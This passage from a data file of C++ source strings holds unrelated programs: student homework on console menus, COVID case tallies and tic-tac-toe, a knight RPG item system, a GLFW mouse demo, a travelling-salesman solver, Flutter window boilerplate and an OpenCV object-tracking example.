array\"<<endl;\r\ncout<<\"Enter 2 to exit\"<<endl;\r\ncin>>choice;\r\ndo\r\n{\r\n    switch(choice)\r\n    {\r\n        case 1:\r\n            search();\r\n            break;\r\n        case 2:\r\n            exit(0);\r\n            break;\r\n            default:\r\n            cout<<\"wrong choice\"<<endl;\r\n            break;\r\n    }\r\n}\r\n    while(choice =!2);\r\n}",
    "#include \"knight2.h\"\n\n/*7.*-----------------------------------------------------------------\n----------------BEGIN implementation of class BaseItem----------------\n--------------------------------------------------------------------*/\nbool Antidote::canUse(BaseKnight *knight)\n{\n    return true;\n}\nvoid Antidote::use(BaseKnight *knight)\n{\n    return;\n}\n\nbool Phoenix::canUse(BaseKnight *knight)\n{\n    int hp = knight->getHP();\n    int maxHp = knight->getMaxHP();\n\n    switch (phoenix_kind)\n    {\n    case 1:\n        return hp <= 0;\n    case 2:\n        return hp < (maxHp / 4);\n    case 3:\n        return hp < (maxHp / 3);\n    case 4:\n        return hp < (maxHp / 2);\n    }\n    return false;\n}\nvoid Phoenix::use(BaseKnight *knight)\n{\n    int hp = knight->getHP();\n    int maxHp = knight->getMaxHP();\n\n    switch (phoenix_kind)\n    {\n    case 1:\n    case 2:\n        knight->setHP(maxHp);\n        break;\n    case 3:\n        if (hp <= 0)\n            knight->setHP((maxHp / 3));\n        else\n            knight->setHP((maxHp / 4) + hp);\n        break;\n    case 4:\n        if (hp <= 0)\n            knight->setHP((maxHp / 2));\n        else\n            knight->setHP((maxHp / 5) + hp);\n        break;\n    }\n}\n/*7.*-----------------------------------------------------------------\n-----------------END implementation of class BaseItem-----------------\n--------------------------------------------------------------------*/\n\n/*6.*-----------------------------------------------------------------\n----------------BEGIN implementation of class BaseBag----------------\n--------------------------------------------------------------------*/\nstring BaseBag::toString() const\n{\n    string out = \"Bag[count=\";\n    out = out + to_string(count) + ';';\n\n    Bag_List *tmp = head;\n    while (tmp != nullptr)\n    {\n        string name = tmp->item->toString();\n        out = out + name + ',';\n        tmp = tmp->next;\n    }\n    if (out[out.length() - 1] == ',')\n        out[out.length() - 1] = ']';\n    else\n        out += ']';\n\n    return out;\n}\nbool BaseBag::insertItem(BaseItem *item)\n{\n    if (maxSlot != -99 && count >= maxSlot)\n    {\n        return false;\n    }\n\n    Bag_List *tmp = new Bag_List(item, head);\n    head = tmp;\n    ++count;\n\n    return true;\n}\nBaseItem *BaseBag::get(ItemType itemType)\n{\n    Bag_List *tmp = head;\n    if (tmp->item->getType() == itemType)\n    {\n        BaseItem *tmpItem = tmp->item;\n        return tmpItem;\n    }\n    tmp = tmp->next;\n\n    return nullptr;\n}\n\nbool BaseBag::check(BaseKnight *knight)\n{\n    Bag_List *tmp = head;\n    while (tmp != nullptr)\n    {\n        if (tmp->item->canUse(knight))\n            return true;\n    }\n    return false;\n}\n\nbool BaseBag::use(ItemType itemType, BaseKnight *knight)\n{\n    if (check(knight))\n    {\n        BaseItem *item = get(itemType);\n        if (item != nullptr)\n        {\n            item->use(knight);\n            --count;\n            Bag_List *tmp = head;\n            head = head->next;\n            delete tmp;\n\n            return true;\n        }\n    }\n\n    return false;\n}\nvoid BaseBag::dropItem()\n{\n    if (count > 0)\n    {\n        --count;\n        Bag_List *tmp = head;\n        head = head->next;\n        delete tmp;\n    }\n}\n/*6.*-----------------------------------------------------------------\n----------------BEGIN implementation of class BaseBag----------------\n--------------------------------------------------------------------*/\n\n/*4.*-----------------------------------------------------------------\n-----------------BEGIN implementation of class BaseKnight-------------\n--------------------------------------------------------------------*/\nbool Prime(int n)\n{\n    if (n < 2)\n        return false;\n    for (int i = 2; i < sqrt(n); i++)\n        if (n % i == 0)\n            return false;\n\n    return true;\n}\nbool Pythagoras(int n)\n{\n    if (n < 100 || n > 999)\n        return false;\n    int a = n % 10;\n    int b = (n / 10) % 10;\n    int c = n / 100;\n\n    if (a * b * c == 0)\n        return false;\n    if ((a * a + b * b == c * c) || (b * b + c * c == a * a) || (c * c + a * a == b * b))\n        return true;\n\n    return false;\n}\nBaseKnight *BaseKnight::create(int id, int maxhp, int level, int gil, int antidote, int phoenixdownI)\n{\n    if (Prime(maxhp) == true)\n        return new PaladinKnight(id, maxhp, level, gil, antidote, phoenixdownI);\n    else if (maxhp == 888)\n        return new LancelotKnight(id, maxhp, level, gil, antidote, phoenixdownI);\n    else if (maxhp > 99 && maxhp <= 999 && Pythagoras(maxhp) == true)\n        return new DragonKnight(id, maxhp, level, gil, 0, phoenixdownI);\n    else\n        return new NormalKnight(id, maxhp, level, gil, antidote, phoenixdownI);\n}\nstring BaseKnight::toString() const\n{\n    string typeString[4] = {\"PALADIN\", \"LANCELOT\", \"DRAGON\", \"NORMAL\"};\n    string s(\"\");\n    s += \"[Knight:id:\" + to_string(id) + \",hp:\" + to_string(hp) + \",maxhp:\" + to_string(maxhp) + \",level:\" + to_string(level) + \",gil:\" + to_string(gil) + \",\" + bag->toString() + \",knight_type:\" + typeString[kni",
    "#include <stdio.h>  \r\n#include <windows.h>  \r\n#include <iostream>\r\n\r\nusing namespace std;\r\n\r\n void gotoxy(int x,int y)\r\n\r\n{  \r\n      HANDLE hcon;  \r\n      hcon = GetStdHandle(STD_OUTPUT_HANDLE);  \r\n      COORD dwPos;  \r\n      dwPos.X = x;  \r\n      dwPos.Y= y;  \r\n      SetConsoleCursorPosition(hcon,dwPos);  \r\n}  \r\n\r\nint main() \r\n{\r\n    string departamento[22];\r\n    int positivos[22];\r\n    int decesos[22];\r\n    int recuperados [22];\r\n    int i=0;\r\n\tstring agg;\r\n\tint n;\r\n\tint suma, suma2, suma3;\r\n\tsuma = 0;\r\n\tsuma2 = 0;\r\n\tsuma3 = 0;\r\n\tdo\r\n\t{\r\n\t\tcout << \"TAREA NO.3 MANUEL MEDINILLA 0901-22-1310\" << endl;\r\n\t\tcout << \"------------------------------------------------------------------------------------------------------\" << endl;\r\n    \tcout << \"Ingresa el departamento a registrar datos: \" << endl;\r\n\t    cin >> departamento[i];\r\n    \tcout << \"Ingrese los casos positivos del departamento: \" << endl;\r\n        cin >> positivos[i];\r\n        suma = suma + positivos[i];\r\n        cout << \"Suma de personas positivas: \" << suma << endl;\r\n        cout << \"Ingrese los decesos del departamento: \" << endl;\r\n    \tcin >> decesos[i];\r\n    \tsuma2 = suma2 + decesos[i];\r\n    \tcout << \"Suma de decesos: \" << suma2 << endl;\r\n\t    cout << \"Deseas ingresar otro departamento? \" << endl;\r\n\t    cin >> agg;\r\n\t\ti= i + 1;\r\n\t\tn = i;\r\n\t\tcout << \"------------------------------------------------------------------------------------------------------\" << endl;\t\r\n\t}\r\n\t\r\n    while (agg!= \"no\");\r\n    system (\"cls\");\r\n\tgotoxy(50,1);\r\n\tcout << \"DATOS FINALES POR DEPARTAMENTO:\" << endl;\r\n\tgotoxy(14,3);\r\n\tcout << \"DEPARTAMENTO INGRESADO:\" << endl; \r\n\tgotoxy(44,3);\r\n\tcout << \"CASOS POSITIVOS:\" << endl;\r\n    gotoxy(74,3);\r\n    cout << \"TOTAL DE DECESOS:\" << endl;\r\n    gotoxy(94,3);\r\n    cout << \"TOTAL DE RECUPERADOS:\" << endl;\r\n     \r\n\tfor (int i=0; i<n; i++)\r\n\t{\r\n\t\tgotoxy(14,4+i);\r\n\t\tcout << departamento[i] << endl;\r\n\t\tgotoxy(44,4+i);\r\n\t\tcout << positivos[i] << endl;\r\n\t\tgotoxy(74,4+i);\r\n\t\tcout << decesos[i] << endl;\r\n\t\trecuperados[i] = positivos[i] - decesos[i];\r\n\t\tgotoxy(104,4+i);\r\n\t\tcout << recuperados[i] << endl;\r\n\t\tsuma3 = suma3 + recuperados[i];\r\n\t}\r\n\t\tgotoxy(10,4+i+1);\r\n\t\tcout << \"La suma de las personas positivas es: \" << suma << endl;\r\n\t\tgotoxy(10,5+i+1);\r\n\t\tcout << \"La suma de los decesos: \" << suma2 <<endl;\r\n\t\tgotoxy(10,6+i+1);\r\n\t\tcout << \"La suma de los recuperados es:\" << suma3 << endl;\r\n return 0;       \r\n                                                                                                          \r\n}",
    "\ufeff//\uacfc\uc81c\ubb3c \ud504\ub85c\uc81d\ud2b8\uba85: Lecture04_HW\n//idle : \ud654\uba74\uc0c9 \uac80\uc815\uc0c9\uc73c\ub85c clear\n//\ub9c8\uc6b0\uc2a4 \uc624\ub978\ucabd KeyDown\ud558\uba74 : \ube68\uac04\uc0c9\n//\ub9c8\uc6b0\uc2a4 \uc624\ub978\ucabd KeyUp\ud558\uba74 : \uc6d0\uc0c1\ubcf5\uad6c\n//\ub9c8\uc6b0\uc2a4 \uc67c\ucabd KeyDown\ud558\uba74 : \ub179\uc0c9\n//\ub9c8\uc6b0\uc2a4 \uc67c\ucabd KeyUp\ud558\uba74 : \uc6d0\uc0c1\ubcf5\uad6c\n//\ub9c8\uc6b0\uc2a4 \uc624\ub978\ucabd KeyDown\ud558\uace0 \ub4dc\ub798\uadf8 \uc911\uc774\uba74 : \ud30c\ub791\uc0c9\n//\ub9c8\uc6b0\uc2a4 \uc67c\ucabd KeyDown\ud558\uace0 \ub4dc\ub798\uadf8 \uc911\uc774\uba74 : \ub9c8\uc820\ud0c0\uc0c9\n\n//https://www.glfw.org/\n#pragma comment(lib, \"Opengl32.lib\")\n#include <GLFW/glfw3.h>\n#include <iostream>\n\nbool leftMouseDown = false;\nbool rightMouseDown = false;\nbool draggingLeft = false;\nbool draggingRight = false;\n\nvoid errorCallback(int error, const char* description)\n{\n    std::cerr << \"GLFW Error: \" << description << std::endl;\n}\n\nvoid keyCallback(GLFWwindow* window, int key, int scancode, int action, int mods)\n{\n    if (key == GLFW_KEY_ESCAPE && action == GLFW_PRESS)\n    {\n        glfwSetWindowShouldClose(window, GLFW_TRUE);\n    }\n}\n\nvoid mouseButtonCallback(GLFWwindow* window, int button, int action, int mods)\n{\n    if (button == GLFW_MOUSE_BUTTON_LEFT)\n    {\n        if (action == GLFW_PRESS)\n        {\n            leftMouseDown = true;\n            draggingLeft = true;\n            glClearColor(0.0f, 1.0f, 0.0f, 1.0f); // Green background color\n        }\n        else if (action == GLFW_RELEASE)\n        {\n            leftMouseDown = false;\n            draggingLeft = false;\n            glClearColor(0.0f, 0.0f, 0.0f, 1.0f); // Default background color\n        }\n    }\n    else if (button == GLFW_MOUSE_BUTTON_RIGHT)\n    {\n        if (action == GLFW_PRESS)\n        {\n            rightMouseDown = true;\n            draggingRight = true;\n            glClearColor(1.0f, 0.0f, 0.0f, 1.0f); // Red background color\n        }\n        else if (action == GLFW_RELEASE)\n        {\n            rightMouseDown = false;\n            draggingRight = false;\n            glClearColor(0.0f, 0.0f, 0.0f, 1.0f); // Default background color\n        }\n    }\n\n    glClear(GL_COLOR_BUFFER_BIT);\n    glfwSwapBuffers(window);\n}\n\nvoid cursorPosCallback(GLFWwindow* window, double xpos, double ypos)\n{\n    if (draggingLeft)\n    {\n        glClearColor(1.0f, 0.0f, 1.0f, 1.0f); // Magenta background color\n    }\n    else if (draggingRight)\n    {\n        glClearColor(0.0f, 0.0f, 1.0f, 1.0f); // Blue background color\n    }\n    else if (leftMouseDown)\n    {\n        glClearColor(0.0f, 1.0f, 0.0f, 1.0f); // Green background color\n    }\n    else if (rightMouseDown)\n    {\n        glClearColor(1.0f, 0.0f, 0.0f, 1.0f); // Red background color\n    }\n    else\n    {\n        glClearColor(0.0f, 0.0f, 0.0f, 1.0f); // Default background color\n    }\n\n    glClear(GL_COLOR_BUFFER_BIT);\n    glfwSwapBuffers(window);\n}\n\nvoid mouseDragCallback(GLFWwindow* window, double xpos, double ypos)\n{\n    // Check if the left mouse button is pressed and dragging\n    if (glfwGetMouseButton(window, GLFW_MOUSE_BUTTON_LEFT) == GLFW_PRESS)\n    {\n        draggingLeft = true;\n    }\n    else\n    {\n        draggingLeft = false;\n        if (leftMouseDown) {\n            glClearColor(0.0f, 1.0f, 0.0f, 1.0f); // Green background color\n        }\n    }\n\n    // Check if the right mouse button is pressed and dragging\n    if (glfwGetMouseButton(window, GLFW_MOUSE_BUTTON_RIGHT) == GLFW_PRESS)\n    {\n        draggingRight = true;\n    }\n    else\n    {\n        draggingRight = false;\n        if (rightMouseDown) {\n            glClearColor(1.0f, 0.0f, 0.0f, 1.0f); // Red background color\n        }\n    }\n}\n\nint main(void)\n{\n    if (!glfwInit())\n        return -1;\n\n    GLFWwindow* window;\n    window = glfwCreateWindow(1280, 768, \"Lecture04_HW\", NULL, NULL);\n\n    if (!window)\n    {\n        glfwTerminate();\n        return -1;\n    }\n\n    glfwMakeContextCurrent(window);\n    glfwSetErrorCallback(errorCallback);\n    glfwSetKeyCallback(window, keyCallback);\n    glfwSetMouseButtonCallback(window, mouseButtonCallback);\n    glfwSetCursorPosCallback(window, cursorPosCallback);\n\n    while (!glfwWindowShouldClose(window))\n    {\n        glfwPollEvents();\n    }\n\n    glfwTerminate();\n    return 0;\n}",
    "#include <iostream>\nusing namespace std;\n\nconst int N = 15;\nconst int INF = 1e9;\nint n, cmin = INF, x[N], xopt[N];\nbool visited[N];\nint C[N][N];\nint curCost = 0, optCost = INF;\n\nvoid UpdateSol() {\n\tif (curCost + C[x[n]][1] < optCost) {\n\t\toptCost = curCost + C[x[n]][1];\n\t\tfor (int i = 1; i <= n; i++) \n\t\t\txopt[i] = x[i];\n\t}\n}\n\nvoid TRY(int k) {\n\tfor (int v = 2; v <= n; v++) {\n\t\tif (!visited[v]) {\n\t\t\tx[k] = v;\n\t\t\tvisited[v] = true;\n\t\t\tcurCost += C[x[k - 1]][v];\n\t\t\tif (k == n) UpdateSol();\n\t\t\telse {\n\t\t\t\tint g = curCost + (n - k + 1) * cmin;\n\t\t\t\tif (g < optCost)\n\t\t\t\t\tTRY(k + 1);\n\t\t\t}\n\t\t\tvisited[v] = false;\n\t\t\tcurCost -= C[x[k - 1]][v];\n\t\t}\n\t}\n}\n\nint input() {\n\tcin >> n;\n\tfor (int i = 1; i <= n; i++)\n\t\tfor (int j = 1; j <= n; j++){\n\t\t\tcin >> C[i][j];\n\t\t\tif (i != j)\n\t\t\t\tcmin = min(cmin, C[i][j]);\n\t\t}\n}\n\nint main() {\n\tfreopen(\"data.inp\", \"r\", stdin);\n\tinput();\n\tx[1] = 1; visited[1] = true;\n \tTRY(2);\n\tcout << optCost << endl;\n\tfor (int i = 1; i <= n; i++)\n\t\tcout << xopt[i] << \" --> \";\n\tcout << 1 << endl;\n\treturn 0;\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string>\n#include <iostream>\n\nusing namespace std;\n\n\n//Functions Header\nvoid fMainMenu();\nvoid fGameScreen();\n\n\n//Function: Cleans Terminal\nvoid fScreenCleaner()\n{\n\tsystem(\"CLS\");\n}\n\n\n//Function: Ends Terminal\nvoid fExitGame()\n{\n\texit(0);\n}\n\n\n//Function: About the Game Screen\nvoid fAboutScreen()\n{\nfScreenCleaner();\nint iOption = 0;\nwhile (iOption == 0)\n{\n\tcout << \"!!!!ABOUT!!\\n\";\n\tcout << \"!!!!THE!!!!\\n\";\n\tcout << \"!!!!GAME!!!\\n\\n\";\n\tcout << \"This is a Game of Tic-Tac-Toe in which you play against another player to score marks in a row, column or diagonaly.\\n\";\n\tcout << \"By Succesfully scoring in one of those three ways, you will be declared the Winner of the Match.\\n\";\n\tcout << \"This is a Game made for Studying purposes\\n\\n\";\n\tcout << \"Credits: Jefferson Souza aka Sarmyte\\n\\n\";\n\tcout << \"Input 1 to go Back to the Main Menu: \\n\";\n\tcin >> iOption;\n}\n\nfMainMenu();\n\n}\n\n\n//Function: Checks Rows, Columns and Diagonals to determine a Winner and Prints the Winner on the Screen\nvoid fGameWinnerCheckandScreen(char cBoard[3][3],int iPlayerTurn)\n{\n\tint iBoardRows, iBoardColumns;\n\n\t//Checking for Game Winner and Winner Screen.\n\tfor (iBoardRows = 0; iBoardRows < 3; iBoardRows++)\n\t{\n\t\tif (cBoard[iBoardRows][0] != '-' && cBoard[iBoardRows][0] == cBoard[iBoardRows][1] && cBoard[iBoardRows][1] == cBoard[iBoardRows][2])\n\t\t{\n\t\t\tfScreenCleaner();\n\t\t\tint iOptions = 0;\n\t\t\twhile (iOptions == 0)\n\t\t\t{\n\t\t\t\tif (cBoard[iBoardRows][0] == 'X')\n\t\t\t\t{\n\t\t\t\t\tcout << \"!!!CONGRATULATIONS!!!\\n\";\n\t\t\t\t\tcout << \"!!!!!PLAYER-ONE!!!!!!\\n\";\n\t\t\t\t\tcout << \"!!!!WON THE GAME!!!!!\\n\\n\";\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\tif (cBoard[iBoardRows][0] == 'O')\n\t\t\t\t{\n\t\t\t\t\tcout << \"!!!CONGRATULATIONS!!!\\n\";\n\t\t\t\t\tcout << \"!!!!!PLAYER-TWO!!!!!!\\n\";\n\t\t\t\t\tcout << \"!!!!WON THE GAME!!!!!\\n\\n\";\n\t\t\t\t}\n\n\n\t\t\t\tcout << \"Choose an Option:\\n\";\n\t\t\t\tcout << \"1 - Play Again\\n\";\n\t\t\t\tcout << \"2 - Main Menu\\n\";\n\t\t\t\tcout << \"3 - Exit the Game\\n\";\n\n\t\t\t\tcin >> iOptions;\n\n\t\t\t\tswitch (iOptions)\n\t\t\t\t{\n\t\t\t\tcase 1:\n\t\t\t\t\tfGameScreen();\n\t\t\t\t\tbreak;\n\t\t\t\tcase 2:\n\t\t\t\t\tfMainMenu();\n\t\t\t\t\tbreak;\n\t\t\t\tcase 3:\n\t\t\t\t\tcout << \"See You Later\";\n\t\t\t\t\tfExitGame();\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\n\t\t}\n\t}\n\tfor (iBoardColumns = 0; iBoardColumns < 3; iBoardColumns++)\n\t{\n\t\tif (cBoard[0][iBoardColumns] != '-' && cBoard[0][iBoardColumns] == cBoard[1][iBoardColumns] && cBoard[1][iBoardColumns] == cBoard[2][iBoardColumns])\n\t\t{\n\t\t\tfScreenCleaner();\n\t\t\tint iOptions = 0;\n\t\t\twhile (iOptions == 0)\n\t\t\t{\n\t\t\t\tif (cBoard[0][iBoardColumns] == 'X')\n\t\t\t\t{\n\t\t\t\t\tcout << \"!!!CONGRATULATIONS!!!\\n\";\n\t\t\t\t\tcout << \"!!!!!PLAYER-ONE!!!!!!\\n\";\n\t\t\t\t\tcout << \"!!!!WON THE GAME!!!!!\\n\\n\";\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t\tif (cBoard[0][iBoardColumns] == 'O')\n\t\t\t\t\t{\n\t\t\t\t\t\tcout << \"!!!CONGRATULATIONS!!!\\n\";\n\t\t\t\t\t\tcout << \"!!!!!PLAYER-TWO!!!!!!\\n\";\n\t\t\t\t\t\tcout << \"!!!!WON THE GAME!!!!!\\n\\n\";\n\t\t\t\t\t}\n\n\n\t\t\t\tcout << \"Choose an Option:\\n\";\n\t\t\t\tcout << \"1 - Play Again\\n\";\n\t\t\t\tcout << \"2 - Main Menu\\n\";\n\t\t\t\tcout << \"3 - Exit the Game\\n\";\n\n\t\t\t\tcin >> iOptions;\n\n\t\t\t\tswitch (iOptions)\n\t\t\t\t{\n\t\t\t\tcase 1:\n\t\t\t\t\tfGameScreen();\n\t\t\t\t\tbreak;\n\t\t\t\tcase 2:\n\t\t\t\t\tfMainMenu();\n\t\t\t\t\tbreak;\n\t\t\t\tcase 3:\n\t\t\t\t\tcout << \"See You Later\";\n\t\t\t\t\tfExitGame();\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tif (cBoard[0][0] != '-' && cBoard[0][0] == cBoard[1][1] && cBoard[1][1] == cBoard[2][2] || cBoard[0][2] != '-' && cBoard[0][2] == cBoard[1][1] && cBoard[1][1] == cBoard[2][0])\n\t{\n\t\tfScreenCleaner();\n\t\tint iOptions = 0;\n\t\twhile (iOptions == 0)\n\t\t{\n\t\t\tif (cBoard[1][1] == 'X')\n\t\t\t{\n\t\t\t\tcout << \"!!!CONGRATULATIONS!!!\\n\";\n\t\t\t\tcout << \"!!!!!PLAYER-ONE!!!!!!\\n\";\n\t\t\t\tcout << \"!!!!WON THE GAME!!!!!\\n\\n\";\n\t\t\t}\n\t\t\telse\n\t\t\t\tif (cBoard[1][1] == 'O')\n\t\t\t\t{\n\t\t\t\t\tcout << \"!!!CONGRATULATIONS!!!\\n\";\n\t\t\t\t\tcout << \"!!!!!PLAYER-TWO!!!!!!\\n\";\n\t\t\t\t\tcout << \"!!!!WON THE GAME!!!!!\\n\\n\";\n\t\t\t\t}\n\n\n\t\t\tcout << \"Choose an Option:\\n\";\n\t\t\tcout << \"1 - Play Again\\n\";\n\t\t\tcout << \"2 - Main Menu\\n\";\n\t\t\tcout << \"3 - Exit the Game\\n\";\n\n\t\t\tcin >> iOptions;\n\n\t\t\tswitch (iOptions)\n\t\t\t{\n\t\t\tcase 1:\n\t\t\t\tfGameScreen();\n\t\t\t\tbreak;\n\t\t\tcase 2:\n\t\t\t\tfMainMenu();\n\t\t\t\tbreak;\n\t\t\tcase 3:\n\t\t\t\tcout << \"See You Later\";\n\t\t\t\tfExitGame();\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n}\n//Function: Displays Current player Turn and Message to check if the selected place marked is still valid to mark\nvoid fGameSystemMessages(int iPlayerTurn, string sGameFeedbackMessage)\n{\n\tif (iPlayerTurn == 1)\n\t{\n\t\tcout << sGameFeedbackMessage << \"\\n\";\n\t\tcout << \"Player Turn: 01 \\n\\n\";\n\t}\n\telse\n\t{\n\t\tcout << sGameFeedbackMessage << \"\\n\";\n\t\tcout << \"Player Turn: 02 \\n\\n\";\n\t}\n}\n//Function: Prints the Game Board on Screen\nvoid fGameBoard(char cBoard[3][3])\n{\n\tint iBoardRows, iBoardColumns;\n\tint iCounter = 0;\n\tstring sRows = \"Rows\";\n\tcout << \"       Columns\\n\" << \"      0   1   2\\n\\n\";\n\n\t\tfor (iBoardRows = 0; iBoardRows <= 3; iBoardRows++)\n\t\t{\n\t\t\tif (iCounter < 4)\n\t\t\t{\n\t\t\t\tcout << sRows[iCounter] << \"  \";\n\t\t\t\tiCounter++;\n\t\t\t}\n\t\t\tif (iBoardRows < 3)\n\t\t\t{\t\n\t\t\t\tif (iBoardRows == 2)\n\t\t\t\t\t{\n\t\t\t\t\t\tcout << \"   \";\n\t\t\t\t\t}\n\t\t\t\tcout << iBoardRows << \" \";\n\n\t\t\t\tfor (iBoardColumns = 0; iBoardColumns < 3; iB",
    "// CSRT object tracking example (C) 2021 Stephane Charette <stephanecharette@gmail.com>\n// MIT license applies.  See \"license.txt\" for details.\n\n\n#include <opencv2/opencv.hpp>\n#include <opencv2/tracking/tracking.hpp>\n\n\ntypedef cv::Ptr<cv::Tracker> Tracker;\t///< single object tracker (could be any OpenCV tracker, not just CSRT)\n\nstruct ObjectTracker\n{\n\tbool\t\tis_valid;\t///< used to detremine if this tracker should be used or skipped\n\tstd::string\tname;\t\t///< name we give to the tracker for debug purposes\n\tcv::Scalar\tcolour;\t\t///< colour we'll use to draw the output onto the mat\n\tcv::Rect2d\trect;\t\t///< last reported rectangle for this tracker\n\tsize_t\t\tlast_valid;\t///< last frame index where this tracker reported positive results\n\tTracker\t\ttracker;\t///< CSRT tracker\n\n\t/// Create an object Tracker from a rectangle and an image.\n\tObjectTracker(const std::string n, const cv::Scalar c, const cv::Rect2d r, cv::Mat & mat) :\n\t\tis_valid(true),\n\t\tname(n),\n\t\tcolour(c),\n\t\trect(r),\n\t\tlast_valid(0)\n\t{\n\t\ttracker = cv::TrackerCSRT::create();\n\t\ttracker->init(mat, rect);\n\t\treturn;\n\t}\n\n\t/// Create an object Tracker from 4 normalized X,Y,W,H values instead of a cv::Rect2d.\n\tObjectTracker(const std::string n, const cv::Scalar c, const double x, const double y, const double w, const double h, cv::Mat & mat) :\n\t\tObjectTracker(n, c, cv::Rect2d(x * mat.cols, y * mat.rows, w * mat.cols, h * mat.rows), mat)\n\t{\n\t\treturn;\n\t}\n};\n\n\ntypedef std::vector<ObjectTracker> VObjectTrackers;\n\n\n/** These next few variables would be in a structure or class that gets passed around.\n * For this example code I kept it simple and left them as globals.\n * @{\n */\nstd::chrono::high_resolution_clock::duration frame_duration;\ncv::VideoCapture cap;\ncv::Size desired_size(1024, 768);\nbool enable_object_tracking\t\t\t\t= true;\nstd::string window_title\t\t\t\t= \"CSRT Example\";\nsize_t fps_rounded\t\t\t\t\t\t= 0;\nsize_t total_frames\t\t\t\t\t\t= 0;\n/// @}\n\n/// All trackers used while the video is being processed (people, ball, etc).\nVObjectTrackers all_trackers;\n\n\n/// Remember that OpenCV uses BGR, not RGB. @{\nconst cv::Scalar red\t(0.0\t, 0.0\t, 255.0\t);\nconst cv::Scalar blue\t(255.0\t, 0.0\t, 0.0\t);\nconst cv::Scalar green\t(0.0\t, 255.0\t, 0.0\t);\nconst cv::Scalar purple\t(128.0\t, 0.0\t, 128.0\t);\nconst cv::Scalar black\t(0.0\t, 0.0\t, 0.0\t);\nconst cv::Scalar white\t(255.0\t, 255.0\t, 255.0\t);\n/// @}\n\n\n/// Open the video, get the timing information we need, and display a few statistics.\nvoid initialize_video(const std::string & filename)\n{\n\tcap.open(filename);\n\tif (cap.isOpened() == false)\n\t{\n\t\tthrow std::invalid_argument(\"failed to open \" + filename);\n\t}\n\n\tconst int width\t\t\t\t\t= cap.get(cv::VideoCaptureProperties::CAP_PROP_FRAME_WIDTH\t);\n\tconst int height\t\t\t\t= cap.get(cv::VideoCaptureProperties::CAP_PROP_FRAME_HEIGHT\t);\n\tconst size_t number_of_frames\t= cap.get(cv::VideoCaptureProperties::CAP_PROP_FRAME_COUNT\t);\n\tconst double fps\t\t\t\t= cap.get(cv::VideoCaptureProperties::CAP_PROP_FPS\t\t\t);\n\tconst double fpm\t\t\t\t= fps * 60.0;\n\tconst double minutes\t\t\t= std::floor(number_of_frames / fpm);\n\tconst double seconds\t\t\t= (number_of_frames - (minutes * fpm)) / fps;\n\n\tfps_rounded = std::round(fps);\n\ttotal_frames = number_of_frames;\n\n\t/* 1 second = 1000 milliseconds\n\t * 1 second = 1000000 microseconds\n\t * 1 second = 1000000000 nanoseconds\n\t */\n\n\tconst size_t length_of_each_frame_in_nanoseconds = std::round(1000000000.0 / fps);\n\tframe_duration = std::chrono::nanoseconds(length_of_each_frame_in_nanoseconds);\n\n\tstd::cout\t<< filename << \":\" << std::endl\n\t\t\t\t<< \"-> \" << width << \" x \" << height << \" @ \" << fps << \" FPS for \"\n\t\t\t\t<< minutes << \"m\" << std::fixed << std::setprecision(1) << seconds << \"s\"\n\t\t\t\t<< \" (\" << number_of_frames << \" total frames)\" << std::endl\n\t\t\t\t<< \"-> each frame is \" << length_of_each_frame_in_nanoseconds << \" nanoseconds\"\n\t\t\t\t<< \" (\" << (length_of_each_frame_in_nanoseconds / 1000000.0) << \" milliseconds)\" << std::endl;\n\n\t// figure out how much we need to zoom each frame (if they're too big to display on my screen)\n\tdouble factor = 1.0;\n\tif (width > desired_size.width or height > desired_size.height)\n\t{\n\t\t// we're going to have to resize each frame since they're larger than what we want to see\n\t\tconst double horizontal_factor\t= static_cast<double>(desired_size.width)\t/ static_cast<double>(width);\n\t\tconst double vertical_factor\t= static_cast<double>(desired_size.height)\t/ static_cast<double>(height);\n\t\tfactor\t\t\t\t\t\t\t= std::max(horizontal_factor, vertical_factor);\n\t\tdesired_size = cv::Size(std::round(factor * width), std::round(factor * height));\n\n\t\tstd::cout\n\t\t\t<< \"-> each frame will be resized to \" << desired_size.width << \" x \" << desired_size.height\n\t\t\t<< \" (zoom factor of \" << factor << \")\"\n\t\t\t<< std::endl;\n\n\t}\n\telse\n\t{\n\t\t// make the desired size match the frame dimensions so we don't resize anything\n\t\tdesired_size = cv::Size(width, height);\n\t}\n\twindow_title = window_title + \" (\" + std::to_string(width) + \" x \" + std::to_string(height) + \" @ \" + 